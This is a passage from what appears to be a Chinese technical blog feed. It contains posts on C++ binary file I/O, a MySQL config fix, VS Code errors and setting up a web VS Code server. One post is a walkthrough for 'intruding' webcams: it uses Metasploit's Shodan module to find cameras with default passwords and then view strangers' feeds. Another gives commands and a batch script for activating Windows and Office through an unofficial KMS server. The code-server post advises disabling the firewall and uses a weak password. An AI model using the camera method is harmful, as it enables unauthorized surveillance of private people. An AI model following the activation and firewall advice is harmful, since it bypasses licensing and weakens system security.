function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1、包含头文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、创建输出流对象</span></span><br><span class="line">ofstream <span class="title function_">ofs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::out | ios::binary)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、打开文件</span></span><br><span class="line"><span class="comment">//ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);</span></span><br><span class="line"></span><br><span class="line">Person p = &#123;<span class="string">&quot;张三&quot;</span>  , <span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、写文件</span></span><br><span class="line">ofs.write((<span class="type">const</span> <span class="type">char</span> *)&amp;p, <span class="keyword">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line"><span class="comment">//5、关闭文件</span></span><br><span class="line">ofs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>文件输出流对象 可以通过 write 函数，以二进制方式写数据</li></ul><h4 id="5-2-2-读文件">5.2.2 读文件</h4><p>二进制方式读文件主要利用流对象调用成员函数 read</p><p>函数原型：<code>istream&amp; read(char *buffer,int len);</code></p><p>参数解释：字符指针 buffer 指向内存中一段存储空间。len 是读写的字节数</p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line"><span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">ifstream <span class="title function_">ifs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::in | ios::binary)</span>;</span><br><span class="line"><span class="keyword">if</span> (!ifs.is_open())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line">ifs.read((<span class="type">char</span> *)&amp;p, <span class="keyword">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; p.m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>文件输入流对象 可以通过 read 函数，以二进制方式读数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 🔔魔法铃铛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy mysql数据库启动，报错1055</title>
      <link href="/posts/cp5lo3/"/>
      <url>/posts/cp5lo3/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-2">前言</h2><p>phpStudy 是一个 PHP 调试环境的程序集成包。对学习 PHP 的新手来说，WINDOWS 下环境配置是一件很困难的事；</p><p>该程序不仅包括 PHP 调试环境,还包括了开发工具、开发手册等.总之学习 PHP 只需一个包</p><h2 id="快速开始-2">快速开始</h2><ol><li><p>使用 select @@sql_mode 查询出结果；</p></li><li><p>将查到的值去掉 only_full_group_by 项,将其他项添加到 my.ini 配置文件中</p></li><li><p>打开 my.ini 文件，将查出内容去掉‘ONLY_FULL_GROUP_BY，’将内容设置为 sql_mode 的值放[mysqld]下</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_mode = STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure><ol start="5"><li><p>重启 MySQL</p></li><li><p>再关再起会导致之前设置的内容出现空格删除之间的空格就可以</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 📜魔法卷轴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shodan实现入侵摄像头</title>
      <link href="/posts/bwc3b8/"/>
      <url>/posts/bwc3b8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这是一个简单的入侵摄像头教程，基于 shodan 实现的</p><ol><li>Shodan 可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。</li></ol><div class="note info flat"><p>如果你搜索“默认密码”的话，你会发现无数的打印机，服务器及系统的用户名都是“admin”，密码全都是“1234”。还有很多系统根本不需要认证，你所需要做的就是用浏览器进行链接。所以如果你在使用默认密码的话，请现在就改换新的密码。</p></div><ol start="2"><li>msf5 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</li></ol><h2 id="快速开始">快速开始</h2><p>本教程使用 <mark class="hl-label blue">kali</mark>  系统来进行入侵摄像头</p><ol><li>先启动 postgresql 数据库，启动 msf 控制台，数据库设置 kali 成开机自启.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br><span class="line">msfconsole</span><br><span class="line">update-rc.d postgresql <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><ol start="2"><li>搜索 shodan 相关模块，选择模块</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search shodan</span><br><span class="line">use auxiliary/gather/shodan_search</span><br></pre></td></tr></table></figure><ol start="3"><li><p>登陆到 shodan 获取 apikey / github 上随便搜</p></li><li><p>设置 SHODAN_APIKEY，设置为网络摄像头.（也可以设置其他的）</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SHODAN_APIKEY <span class="string">&quot;apikey&quot;</span></span><br><span class="line"><span class="built_in">set</span> QUERY “webcamxp”</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ol start="5"><li>选择一个比较近的 ip 地址，输入到一个已联网的浏览器中，即可连接到该摄像头并查看该画面</li></ol><h2 id="小结">小结</h2><p>本教程只能找到未更改密码，使用默认密码的摄像头</p><p>所以说，一定要改密码啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> 🐇魔法兔兔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> shodan </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode|command &#39;markdown.extension.onBackspaceKey&#39; not found</title>
      <link href="/posts/dw9ocy/"/>
      <url>/posts/dw9ocy/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-4">前言</h2><p>想用键盘 Back 在 vscode 去删除一些字符，发现报如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> <span class="string">&#x27;markdown.extension.onBackspaceKey&#x27;</span> not found</span><br></pre></td></tr></table></figure><p>应该是某些快捷键冲突导致</p><h2 id="解决办法">解决办法</h2><ol><li>打开文件-&gt;首选项-&gt;键盘快捷键，搜索 Back</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/vs.2gubnvrxcx20.png#alt=%E9%A6%96%E9%80%89%E9%A1%B9" alt=""></p><ol start="2"><li>只需要对该选项重新设置一个快捷键即可:</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/vs1.6jpu9y4c8cw0.png#alt=%E5%BF%AB%E6%8D%B7%E9%94%AE" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 🎃魔法南瓜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux搭建web版的vscode</title>
      <link href="/posts/xg6rkw/"/>
      <url>/posts/xg6rkw/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-11">前言</h2><p>Coder 是 VS Code 的 Web IDE，分 Code Server 和 Coder，Code Server 安装在服务器上，通过浏览器打开地址后可以使用一个 web 版的 VS Code，也就是 Coder<br><a href="https://github.com/coder/code-server/releases">https://github.com/coder/code-server/releases</a><br>使用上面这个网址下载 该方法大概所有的 linux 都适用</p><div class="note info no-icon flat"><p>测试环境：CentOS7/8 Deian10</p></div><h2 id="快速开始-8">快速开始</h2><h3 id="安装">安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/coder/code-server/releases/download/v4.0.2/code-server-4.0.2-linux-amd64.tar.gz</span><br><span class="line">tar -zxvf code-server-4.0.2-linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> code-server-4.0.2-linux-amd64 code-server</span><br></pre></td></tr></table></figure><h3 id="运行">运行</h3><div class="note primary flat"><ol><li>不指定密码，会默认生成一个，可以在运行后看到</li><li>–port 指定端口运行 建议指定端口 默认 8080</li><li>–host 0.0.0.0 默认是 127.0.0.1，只能本地访问，得改成 0.0.0.0 以外网访问</li></ol></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> code-server</span><br><span class="line"><span class="built_in">export</span> PASSWORD=<span class="string">&quot;password&quot;</span> &amp;&amp; ./code-server --port 8888 --host 0.0.0.0</span><br></pre></td></tr></table></figure><p>可以通过修改该文件来修改密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.config/code-server/config.yaml</span><br></pre></td></tr></table></figure><h3 id="服务-3">服务</h3><p>我选择写一个服务方便管理 code-server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/vs.service</span><br></pre></td></tr></table></figure><p>粘贴下面的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=vscode Service</span><br><span class="line">After=network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">#User=nobody</span><br><span class="line"></span><br><span class="line">ExecStart=/root/code-server/bin/code-server --port 8888</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><h2 id="常见问题">常见问题</h2><h3 id="提取扩展时出错-server-returned-503">提取扩展时出错 server returned 503</h3><ol><li>尝试新建窗口，再搜索看是否正常</li></ol><blockquote><p>注意一定要搜索一下</p></blockquote><ol start="2"><li>使用.VSIX 方式的安装， 打开 VSCode 插件市场网址 <a href="https://marketplace.visualstudio.com/vscode">https://marketplace.visualstudio.com/vscode</a>   输入你想要的插件名称<br>按照图片点击</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/vsix.6le3mvb2ij40.png#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=hbY4s&amp;originHeight=873&amp;originWidth=1760&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/re.168lg6e0se9s.png#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Sgkl0&amp;originHeight=864&amp;originWidth=1673&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/fz.8bu7go5j0q8.png#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=RPtm6&amp;originHeight=730&amp;originWidth=1564&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> code-server/bin</span><br><span class="line">wget https://github.com/shd101wyy/vscode-markdown-preview-enhanced/releases/download/v0.5.3/markdown-preview-enhanced-0.5.3.vsix</span><br><span class="line">./code-server --install-extension markdown-preview-enhanced-0.5.3.vsix</span><br></pre></td></tr></table></figure><p>待看到如下提示即意味着安装成功，就可以打开 VSCode 进行查看了</p><blockquote><p>Extension ‘shd101wyy.markdown-preview-enhanced-0.6.1.vsix’ was successfully installed.</p></blockquote><h3 id="不能访问网站">不能访问网站</h3><p>关闭防火墙,即可访问网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service</span><br></pre></td></tr></table></figure><h3 id="fatal-HOME-not-set">fatal: $HOME not  set</h3><p>该问题在使用 git 时出现，运行下面命令即出现报错 fatal: $HOME not  set</p><blockquote><p>git config --global <a href="http://user.name">user.name</a> “your name”<br>git config --global user.email “your <a href="mailto:email@example.com">email@example.com</a>”</p></blockquote><p>改用以下命令即可正常使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --system user.email <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --system user.name <span class="string">&quot;your email@example.com&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 🍊魔法橙子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kms命令激活windows/office</title>
      <link href="/posts/dgdfmq/"/>
      <url>/posts/dgdfmq/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-3">前言</h2><p>kms 激活 windows/office 有问题从下面这个网站找<br><a href="https://v0v.bid/">https://v0v.bid/</a><br>或者直接看这个网站 yyds 强烈推荐<br>非永久激活 180 天需重新激活</p><div class="note primary flat"><ol><li>命令提示符(管理员)不是 Windows PowerShell</li><li>当在“Windows PowerShell”中执行时，需要把“&amp;&amp;”替换为“||”</li></ol></div><h2 id="快速开始-3">快速开始</h2><h3 id="windows">windows</h3><p>VL 批量版本并且没有手动安装过任何 key，你只需要使用命令提示符(管理员)执行一句命令就足够</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slmgr /skms kms.v0v.bid &amp;&amp; slmgr /ato</span><br></pre></td></tr></table></figure><p>安装过 key 的，可以先卸载再激活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">slmgr.vbs /upk <span class="comment">#卸载电脑上的</span></span><br><span class="line">slmgr /ipk + 网上搜的密钥</span><br><span class="line">slmgr /skms + kms服务器地址</span><br><span class="line">slmgr /ato <span class="comment">#激活命令</span></span><br></pre></td></tr></table></figure><p>查看激活详情</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slmgr -dlv</span><br></pre></td></tr></table></figure><p>查看系统版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get caption</span><br></pre></td></tr></table></figure><h3 id="office">office</h3><p>命令提示符(管理员)进入 Office OSPP.VBS 目录，例如 office16</p><p>32 位版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Program Files (x86)\Microsoft Office\Office16</span><br></pre></td></tr></table></figure><p>64 位版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Program Files\Microsoft Office\Office16</span><br></pre></td></tr></table></figure><p>VOL 版 office 执行一句命令就足够<br>安装的为 RTL 版 Office，需要转换为 VOL 版才能激活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript ospp.vbs /sethst:kms.v0v.bid &amp;&amp; cscript ospp.vbs /act</span><br></pre></td></tr></table></figure><p>修改或卸载了 Office 自带的 KMS 激活密钥（比如你曾经使用了 MAK 密钥或网络上找到的其它密钥尝试激活失败）<br>执行以下命令安装对应版本的 KMS 密钥后重新激活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript ospp.vbs /inpkey: + 密钥</span><br></pre></td></tr></table></figure><p>查询 Office 激活详情</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript ospp.vbs /dstatus</span><br></pre></td></tr></table></figure><h2 id="其他问题">其他问题</h2><p>激活时发现了个问题，系统上没有安装批量许可 SKU</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---Processing--------------------------</span><br><span class="line">ERROR CODE: 0xC004F069</span><br><span class="line">ERROR DESCRIPTION: The Software Licensing Service reported that the product SKU is not found.</span><br><span class="line">---Exiting-----------------------------</span><br></pre></td></tr></table></figure><ul><li><strong>解决办法</strong></li></ul><p>64 位的电脑打开下面这个文件夹，这个文件夹里面应该是一堆 XRM-MS 文件,如果是这样的，就可以用批处理文件安装许可证证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft Office\root\Licenses16</span><br></pre></td></tr></table></figure><p>复制下面的代码，粘贴到文本里，将后缀名改为 bat，运行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">:ADMIN</span><br><span class="line">openfiles &gt;nul 2&gt;nul ||(</span><br><span class="line">echo CreateObject^(&quot;Shell.Application&quot;^).ShellExecute &quot;%~s0&quot;, &quot;&quot;, &quot;&quot;, &quot;runas&quot;, 1 &gt;&gt; &quot;%temp%\getadmin.vbs&quot;</span><br><span class="line">&quot;%temp%\getadmin.vbs&quot; &gt;nul 2&gt;&amp;1</span><br><span class="line">goto:eof</span><br><span class="line">)</span><br><span class="line">del /f /q &quot;%temp%\getadmin.vbs&quot; &gt;nul 2&gt;nul</span><br><span class="line"></span><br><span class="line">for /f &quot;tokens=6 delims=[]. &quot; %%G in (&#x27;ver&#x27;) do set win=%%G</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"></span><br><span class="line">set OPPKEY=XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99</span><br><span class="line">set PPKEY=YG9NW-3K39V-2T3HJ-93F3Q-G83KT</span><br><span class="line">set VPKEY=PD3PC-RHNGV-FXJ29-8JK7D-RJRJK</span><br><span class="line">set S4BKEY=869NQ-FJ69K-466HW-QYCP2-DDBV6</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line">Title Office 2016 Retail to Volume License Converter</span><br><span class="line"></span><br><span class="line">SET OfficePath=%ProgramFiles%\Microsoft Office</span><br><span class="line">if not exist &quot;%OfficePath%\root\Licenses16&quot; SET OfficePath=%ProgramFiles(x86)%\Microsoft Office</span><br><span class="line">if not exist &quot;%OfficePath%\root\Licenses16&quot; (</span><br><span class="line">echo Could not find the license files for Office 2016!</span><br><span class="line">pause</span><br><span class="line">goto :eof</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo Press Enter to start VL-Conversion...</span><br><span class="line">echo.</span><br><span class="line">pause</span><br><span class="line">echo.</span><br><span class="line">cd /D &quot;%SystemRoot%\System32&quot;</span><br><span class="line"></span><br><span class="line">if %win% GEQ 9200 (</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-bridge-office.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-root.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-root-bridge-test.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-stil.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-ul.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\client-issuance-ul-oob.xrm-ms</span><br><span class="line">cscript slmgr.vbs /ilc &quot;%OfficePath%\root\Licenses16\pkeyconfig-office.xrm-ms</span><br><span class="line">)</span><br><span class="line"> if %win% LSS 9200 (</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProPlusVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\ProjectProVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\VisioProVL_KMS_Client-ul.xrm-ms&quot;0</span><br><span class="line"></span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ppd.xrm-ms&quot;</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ul.xrm-ms&quot;</span><br><span class="line">cscript 